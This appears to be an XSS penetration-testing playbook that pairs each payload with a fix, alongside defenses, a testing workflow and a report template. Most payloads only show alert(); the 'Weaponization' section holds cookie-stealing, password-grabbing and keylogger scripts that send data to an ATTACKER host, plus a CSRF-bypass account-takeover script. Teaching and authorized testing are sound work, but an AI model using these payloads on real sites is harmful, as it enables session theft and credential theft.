01

HTML Context — Server-Rendered Injection

A1 – A6
A1ReflectedHTML body⚡ auto

Reflected XSS into HTML context with nothing encoded

Situation

The search term is echoed straight into the results page body. No output encoding anywhere — the baseline case. Always probe every parameter with this first; if it reflects raw, you're done.

Payload

?search=<script>alert(document.domain)</script>

Why it works

Reflection lands in HTML body context; the browser parses the injected <script> as part of the page and executes it.

Fix

HTML-entity encode all dynamic values in body context (< → &lt;).

A2StoredHTML body⚡ auto

Stored XSS into HTML context with nothing encoded

Situation

The comment body is persisted and rendered into the blog post for every visitor, unencoded. Impact multiplies: one request from you, endless victims, zero interaction.

Payload — comment field

<script>alert(document.domain)</script>

Why it works

Stored data re-enters the HTML body context unsanitized on every page view; no delivery link needed.

Fix

Encode at output; sanitize rich text with a strict allowlist parser (DOMPurify); HttpOnly on session cookies to blunt impact.

A3ReflectedHTML body + WAF⚡ auto via iframe

Reflected XSS into HTML context with most tags and attributes blocked

Situation

A WAF strips most tags and attributes. Fuzz the allowlist (Intruder: <§tag§> across a tag list, then events per surviving tag). Here body + onresize survive.

Payload + delivery

?search=<body onresize=alert(1)>

<!-- deliver so it fires with no victim action -->
<iframe src="https://TARGET/?search=%3Cbody%20onresize%3Dalert(1)%3E"
        onload="this.width=100px"></iframe>

Why it works

body/onresize pass the allowlist; resizing the iframe right after load fires the handler automatically.

Fix

Tag allowlists are brittle — encode output; use a real sanitizer for legitimate rich content.

A4ReflectedHTML body + WAF⚡ auto

Reflected XSS into HTML context with all tags blocked except custom ones

Situation

The filter blocks every known tag — but only known ones. Custom elements pass through and still parse as elements with full event support.

Payload

<customtag autofocus onfocus=alert(1)>

<!-- fallback: -->
<xss tabindex=1 onfocus=alert(1)>

Why it works

A denylist keyed on existing tag names can't anticipate new ones; autofocus focuses the element at parse time, onfocus fires.

Fix

Deny-by-default parsing — encode, or sanitize with a library that drops unknown elements.

A5ReflectedSVG markup⚡ auto

Reflected XSS with some SVG markup allowed

Situation

The sanitizer permits "some SVG." Fuzz which children survive — animate / animatetransform with onbegin is the classic surviving combo.

Payload

<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- variant: -->
<svg><animatetransform onbegin=alert(1)>

Why it works

The animation starts the moment it parses; onbegin is an event handler riding in on "allowed" SVG.

Fix

Strip animation elements; run SVG through DOMPurify with a tight profile — or don't accept user SVG.

A6Reflectedlink href attr⌨ access key

Reflected XSS in canonical link tag

Situation

Input reflects into <link rel="canonical" href="REFLECTED">. Angle brackets are encoded, but single quotes aren't — and it's an attribute context.

Payload

?/' accesskey='x' onclick='alert(1)

<!-- victim presses the access key:
     Alt+X / Shift+Alt+X / Ctrl+Alt+X (browser-dependent) -->

Why it works

' escapes href; accesskey binds a keystroke to a click on the invisible link → onclick runs.

Fix

Validate/normalize canonical URLs server-side; never reflect raw input into link attributes.

02

Attribute & JavaScript Contexts

B1 – B7
B1Reflectedvalue attribute🖱 hover

Reflected XSS into attribute with angle brackets HTML-encoded

Situation

Reflection inside <input … value="REFLECTED">. < > are entity-encoded so you can't open a new tag — you don't need to. Stay inside the tag and break out of the attribute.

Payload

" onmouseover="alert(document.domain)

Why it works

" closes value, a new onmouseover attribute is parsed, and hovering the input fires it. Encoded brackets are irrelevant — you never left the tag.

Fix

Attribute-encode both quote characters (ENT_QUOTES), or build attributes from an allowlist.

B2Storedanchor href🖱 click

Stored XSS into anchor href attribute with double quotes HTML-encoded

Situation

The "website" field is stored into <a href="REFLECTED">. Double quotes encoded → no attribute breakout. But nobody checks the URL scheme.

Payload — website field

javascript:alert(document.domain)

Why it works

href accepts the javascript: pseudo-protocol; clicking the rendered link runs JS in the page's origin.

Fix

Allowlist schemes (http/https only); reject javascript:, data:, vbscript:; encode the attribute value.

B3ReflectedJS string⚡ auto

Reflected XSS into a JavaScript string with angle brackets HTML-encoded

Situation

Input reflects inside a script block: var searchTerm = 'REFLECTED';. Angle brackets are HTML-encoded — irrelevant: you're already inside JavaScript.

Payload

'-alert(document.domain)-'

Why it works

' closes the string, -alert(…) is a valid unary expression that invokes alert, and the trailing '- keeps the syntax legal.

Fix

JS-escape the value server-side (or JSON.stringify it); better: don't reflect into script blocks — use data-* attributes.

B4Reflectedscript block⚡ auto

Reflected XSS into a JavaScript string with single quote and backslash escaped

Situation

Same sink, but now ' → \' and \ → \\. The string is sealed — however, angle brackets are raw. Leave the script block, not the string.

Payload

</script><script>alert(document.domain)</script>

Why it works

The HTML parser ends the script element at </script> regardless of JavaScript string state — the escaping was applied at the wrong layer.

Fix

HTML-encode </ inside script content; ideally keep user data out of script blocks entirely.

B5ReflectedJS string⚡ auto

Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Situation

<> and " HTML-encoded, ' backslash-escaped — but the backslash itself isn't escaped. Use your own backslash to consume theirs.

Payload

\'-alert(document.domain)//

Why it works

The escaper turns your input into \\' — a literal backslash, then a real closing quote. -alert() executes; // swallows the remainder.

Fix

Escape backslashes before quotes — or just JSON.stringify the value, which handles both.

B6Storedonclick attr🖱 click

Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Situation

The website URL is stored into an event attribute: onclick='…track('REFLECTED')…'. <> and " HTML-encoded; ' and \ JS-escaped. Looks airtight — except HTML decoding happens before JS parsing.

Payload — website field

?&apos;-alert(document.domain)-&apos;

Why it works

The HTML parser decodes &apos; → ' while parsing the attribute — the JS escaper never saw a quote to escape. Double encoding lands where single decoding is applied.

Fix

Never compose JavaScript from user data inside event attributes; use data-* attributes + addEventListener.

B7Reflectedtemplate literal⚡ auto

Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Situation

Input reflects inside a JS template literal; < > ' " \ ` are all \uXXXX-escaped. But $ { } aren't — and inside a template literal, that's all you need.

Payload

${alert(document.domain)}

Why it works

Template interpolation executes arbitrary expressions without breaking out of the string — quote escaping is powerless against ${}.

Fix

Never interpolate user input into template literals; if unavoidable, escape ${ as \${.

03

DOM-Based XSS — Client-Side Source to Sink

C1 – C7

The payload never needs to reach the server. Trace sources (location, postMessage, storage, fetched data) into sinks (innerHTML, document.write, $(), eval). The fragment (#) is your stealth channel — it never appears in server logs.

C1DOMdocument.write⚡ auto

DOM XSS in document.write sink using source location.search

Situation

document.write(…location.search…) — the query string flows straight into an HTML-writing sink on page load.

Payload

?search=<img src=1 onerror=alert(document.domain)>

Why it works

document.write parses the string as HTML in body context. Note: <script> inserted this way won't execute — use an element with an event handler.

Fix

Retire document.write; use textContent for untrusted strings.

C2DOMinnerHTML⚡ auto

DOM XSS in innerHTML sink using source location.search

Situation

el.innerHTML = new URLSearchParams(location.search).get('search') — same source, different sink.

Payload

?search=<img src=1 onerror=alert(document.domain)>

Why it works

innerHTML parses the string as HTML; the image fails to load → onerror fires.

Fix

textContent for text; DOMPurify if real HTML is required.

C3DOMjQuery $()⚡ auto

DOM XSS in jQuery selector sink using a hashchange event

Situation

The page listens for hashchange and passes location.hash to jQuery's $(). jQuery treats a string starting with < as HTML to create, not a selector.

Payload — in the fragment

#<img src=1 onerror=alert(document.domain)>

Why it works

$(location.hash) creates the element; the fragment stays client-side, so server-side filters never see the payload.

Fix

document.getElementById(decodeURIComponent(hash.slice(1))); never pass raw input to $().

C4DOMwrite → select⚡ auto

DOM XSS in document.write sink using source location.search inside a select element

Situation

The search term is written via document.write into an <option> inside a <select>. Looks contained — but the HTML parser disagrees.

Payload

?search=<img src=1 onerror=alert(document.domain)>

Why it works

The parser's "in select" insertion mode closes the select when it meets the img start tag and reprocesses it in normal mode — the img renders, onerror fires.

Fix

Build options with createElement('option') + textContent.

C5DOMAngularJS {{ }}⚡ auto

DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Situation

AngularJS 1.x renders the page and your input reflects into the template. <> and " are encoded — but Angular expressions need neither.

Payload

{{$on.constructor('alert(document.domain)')()}}

<!-- variant: {{constructor.constructor('alert(1)')()}} -->

Why it works

Angular evaluates {{ }} client-side; $on.constructor walks the prototype chain to Function, building and invoking arbitrary JS — no tags, no double quotes.

Fix

Upgrade Angular; enable a strict CSP; never reflect user input into template scope.

C6DOMJSON → innerHTML⚡ auto

Reflected DOM XSS

Situation

The search term reflects into a JSON response — JSON-encoded, so it looks safe. But the client-side search handler takes the parsed value and writes it to innerHTML.

Payload

?search=<img src=1 onerror=alert(document.domain)>

Why it works

The vulnerability moved layers: safe at the server, fatal at the client sink. Always trace JSON values to their DOM sink.

Fix

Render results with textContent/createElement; treat all fetched data as untrusted.

C7DOMstored JSON → innerHTML⚡ auto

Stored DOM XSS

Situation

The comment is stored server-side, served as JSON, and rendered client-side via innerHTML. Neither endpoint alone looks vulnerable — the bug lives in the pipeline.

Payload — comment field

<img src=1 onerror=alert(document.domain)>

Why it works

Storage and execution are decoupled; the client trusts "its own" data and hands it to a dangerous sink.

Fix

Sanitize at the render sink (DOMPurify); never assume stored = safe.

04

Filter & CSP Evasion

D1 – D6
D1EvasionHTML body + WAF🖱 click

Reflected XSS with event handlers and href attributes blocked

Situation

The WAF blocks every on* event handler and the href attribute. You need JS execution with neither.

Payload

<form><button formaction=javascript:alert(document.domain)>Click me</button></form>

Why it works

formaction is a navigation attribute that is neither href nor an event handler — blocklists miss the whole family (action, formaction, srcdoc, data, xlink:href).

Fix

Block javascript: URLs in any navigation attribute; sanitize with an attribute-aware parser.

D2Evasionjavascript: URL🖱 click

Reflected XSS in a JavaScript URL with some characters blocked

Situation

Input reflects into a javascript: URL (e.g., a "Back to Blog" link built from the path). Some characters — often ( ) — are blocked.

Payloads

javascript:alert`1`

javascript:alert&lpar;1&rpar;   <!-- entities decode in attributes -->
javascript:%0dalert(1)          <!-- CR breaks naive regex filters -->

Why it works

Tagged template literals call functions without parentheses; HTML entities are decoded in attribute context before the URL is parsed.

Fix

Never build javascript: URLs from user input; validate/allowlist paths.

D3EvasionAngularJS sandbox⚡ auto

Reflected XSS with AngularJS sandbox escape without strings

Situation

The AngularJS sandbox is active and both quote characters are escaped — you can't write string literals. So build one from char codes.

Payload

{{toString().constructor.prototype.charAt=[].join;
  $eval(toString().constructor.fromCharCode(97,108,101,114,116,40,49,41))}}

<!-- 97,108,101,114,116,40,49,41 = "alert(1)" -->

Why it works

Overwriting charAt blinds the sandbox's string detection; fromCharCode spells alert(1) without a single literal string.

Fix

Upgrade Angular (sandbox removed in 1.6 — its replacements are stronger); strict CSP; keep input out of templates.

D4EvasionAngularJS + CSP⚡ auto

Reflected XSS with AngularJS sandbox escape and CSP

Situation

The page enforces a CSP that kills inline <script> tags — but it also runs AngularJS, whose expression engine is itself an eval machine the policy tolerates.

Payload

{{$eval.constructor('alert(document.domain)')()}}

Why it works

The expression executes inside Angular's own trusted script — no new script element is ever created for the CSP to block. When the framework may eval, expression injection ≡ in-browser RCE.

Fix

Angular 2+ (no eval-based templates) plus a CSP without unsafe-eval.

D5Evasionstrict CSP⚡ auto

Reflected XSS protected by very strict CSP, with dangling markup attack

Situation

Very strict CSP (script-src 'self'): no inline script, no eval, no javascript: URLs. But the injection sits inside an attribute value — and later in the HTML lives a secret (the CSRF token).

Payload — no script executes

"><img src="https://ATTACKER/?

<!-- leave the quote dangling: everything after the injection,
     token included, becomes part of the img URL and is
     GET-ed to your server. Read it from the access log,
     then POST the forged email change with the token. -->

Why it works

The browser percent-encodes the swallowed markup into the request URL — secrets exfiltrate as a plain GET, with zero script execution.

Fix

Attribute-encode " → &quot;; restrict img-src to 'self'; treat token leakage as first-class impact.

D6EvasionCSP + JSONP⚡ auto

Reflected XSS protected by CSP, with CSP bypass

Situation

The CSP allows scripts from specific origins — and one of those origins hosts a JSONP endpoint that reflects the callback parameter raw into a JavaScript response.

Payload

<script src="https://ALLOWED-ORIGIN/data?callback=alert(document.domain)//"></script>

Why it works

The script's origin passes the CSP; the "callback" parameter lets you write its contents. A trusted CDN with a reflector = full CSP bypass.

Fix

Kill JSONP endpoints; pin exact script paths; prefer nonces over host allowlists; add SRI hashes.

05

Weaponization — From Alert to Account Takeover

E1 – E3

An alert box proves execution; it doesn't prove impact. These three chains convert any scenario above into reportable damage. Order of preference: cookies (E1) → if HttpOnly, credentials (E2) → if MFA/awareness, in-session forgery (E3).

E1Weaponizesession theft⚡ auto

Exploiting cross-site scripting to steal cookies

Situation

You have XSS — now convert it into session theft. Exfiltrate document.cookie to your server, then replay the session cookie from your proxy.

Payload

<script>
fetch('https://ATTACKER/log?c=' + encodeURIComponent(document.cookie))
</script>

Why it works

Non-HttpOnly session cookies are readable from JS; one GET and the session is yours. If HttpOnly is set → pivot to E2 or E3.

Fix

HttpOnly; Secure; SameSite on session cookies — limits impact, does not fix the XSS.

E2Weaponizecredential theft⌨ victim login

Exploiting cross-site scripting to capture passwords

Situation

Cookies are HttpOnly — so steal the credentials instead. Inject a grabber that rides the login form's submit event.

Payload

<script>
document.querySelector('form').addEventListener('submit', function (e) {
  e.preventDefault();
  var u = document.querySelector('#user').value;
  var p = document.querySelector('#password').value;
  fetch('https://ATTACKER/log?u=' + encodeURIComponent(u) +
        '&p=' + encodeURIComponent(p)).finally(function () { location.reload(); });
});
</script>

<!-- keylogger variant: -->
<script>document.onkeypress = e => fetch('https://ATTACKER/log?k=' + e.key)</script>

Why it works

The handler runs inside the victim's page before the form leaves — plaintext credentials, straight to you.

Fix

HttpOnly won't help; only eliminating the XSS does. CSP report-only can surface unexpected external fetches.

E3WeaponizeCSRF chain → ATO⚡ auto

Exploiting XSS to bypass CSRF defenses

Situation

The app defends against CSRF with per-session tokens. But XSS runs inside the session — so read the token from a same-origin page and forge the request in one shot.

Payload

<script>
fetch('/my-account').then(r => r.text()).then(html => {
  var token = html.match(/name="csrf" value="([^"]+)"/)[1];
  return fetch('/my-account/change-email', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf=' + token + '&email=attacker@evil.tld'
  });
}).then(() => location = '/my-account');
</script>

Why it works

CSRF tokens stop cross-origin forgeries — they can't stop same-origin script execution. XSS + CSRF = account takeover.

Fix

Fix the XSS; require re-authentication for sensitive actions; SameSite cookies shrink the surface.

07

Defense — Killing the Bug Class

remediation

D1Context-aware output encoding

Encode for the context the value lands in — body, attribute, JS, or URL. One encoder does not cover all four.

// PHP — attribute/body
htmlspecialchars($v, ENT_QUOTES, 'UTF-8');
// Jinja2 — autoescape ON, never |safe on user data
// JS strings — JSON.stringify(value)

D2Safe DOM APIs

Ban dangerous sinks in code review; reach for text-only APIs. When HTML is genuinely required, sanitize.

// ✗ el.innerHTML = userInput
// ✓ el.textContent = userInput
// ✓ el.innerHTML = DOMPurify.sanitize(userHtml)

D3Trusted Types

Forces every assignment to a dangerous sink through an approved policy — DOM XSS becomes structurally hard.

Content-Security-Policy:
  require-trusted-types-for 'script'

D4Strong CSP

Nonce-based script loading; no unsafe-inline/unsafe-eval; lock down object and base. Kills inline injection, JSONP gadgets, and dangling exfil channels.

Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  object-src 'none'; base-uri 'none';
  img-src 'self'; frame-ancestors 'self'

D5Cookie hardening

Doesn't prevent XSS, but severs the E1 cookie-theft chain and raises the cost of every escalation.

Set-Cookie: session=…; HttpOnly; Secure;
            SameSite=Strict; Path=/

D6URL scheme allowlist

For every user-influenced href/src/action: parse with the URL API, accept only http/https.

const u = new URL(input, base);
if (!['http:', 'https:'].includes(u.protocol)) reject();

D7Framework defaults

React escapes by default; keep it that way. Audit every escape hatch: dangerouslySetInnerHTML, v-html, ng-bind-html, |safe. Prefer Angular 2+ over 1.x.

D8Validation is a layer, not a fix

Denylists failed in A3–A5, D1, D2 — attackers fuzz faster than you can list. Use input validation for anomaly detection and defense-in-depth, never as the primary control.

08

Engagement Workflow & Report Skeleton

runbook
  1. Map reflection points. Every parameter, header (Referer, User-Agent), path segment, fragment, and stored field. Note what returns unchanged.
  2. Determine context. View source around each reflection — body, attribute (which quotes?), script block, URL, expression, JSON.
  3. Fingerprint the filter. Compare input vs. output character by character. Which of < > " ' \ ` $ { } survive? Stripped, encoded, or escaped?
  4. Match the ladder. Find your row in the §00 encoding ladder; pick the counter-move.
  5. Craft the minimal payload. Confirm with alert(document.domain). For DOM XSS, test via # and postMessage first.
  6. Establish the trigger. Auto on load? Hover? Click? Access key? Victim visiting a stored page? This defines real-world exploitability.
  7. Escalate to impact. Run E1 → E2 → E3 as applicable. Screenshot the session replay / captured creds / forged action.
  8. Report with the chain. Context + trigger + escalation chain + concrete fix from §07.

Report skeleton

## XSS — <context> — <endpoint>
Severity: High / Critical (CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)
Affected: GET /search?q=  (reflected, HTML body context, no encoding)

Proof of concept:
  https://target/search?q=<script>alert(document.domain)</script>

Trigger: automatic on page load — no interaction required
Impact:  session theft (E1) → CSRF-bypass email change (E3) → account takeover
Chain:   A1 → E1 → E3

Remediation: context-aware output encoding (§07-D1) + CSP nonce (§07-D4)
             + HttpOnly session cookies (§07-D5)
Scope & Ethics

This playbook is for authorized penetration testing, bug bounty hunting on in-scope targets, and defensive engineering. Never execute these techniques against systems you don't own or aren't contracted to test. Payloads use alert(document.domain) as a harmless execution proof — keep PoCs non-destructive.
